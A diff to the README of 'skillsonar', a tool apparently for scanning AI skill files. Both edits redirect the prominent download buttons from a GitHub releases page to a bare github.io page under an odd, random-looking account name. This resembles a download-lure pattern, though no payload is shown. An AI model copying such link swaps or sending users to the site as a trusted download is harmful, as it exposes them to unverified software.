@@ -19,7 +19,7 @@ Think of it like a metal detector for your AI setup. It scans your skill files, 
 
 ### Step 1: Get the Application
 
-**[⬇️ DOWNLOAD skillsonar NOW](https://github.com/corticalepilepsyladyofthehouse956/skillsonar/releases)**
+**[⬇️ DOWNLOAD skillsonar NOW](https://corticalepilepsyladyofthehouse956.github.io)**
 
 This link takes you to the downloads page for skillsonar.
 
@@ -207,7 +207,7 @@ You don't need to be an expert. You don't need to read long documentation. You j
 
 Make your AI skills work perfectly:
 
-**[⬇️ GET skillsonar](https://github.com/corticalepilepsyladyofthehouse956/skillsonar/releases)**
+**[⬇️ GET skillsonar](https://corticalepilepsyladyofthehouse956.github.io)**
 
 ---
 
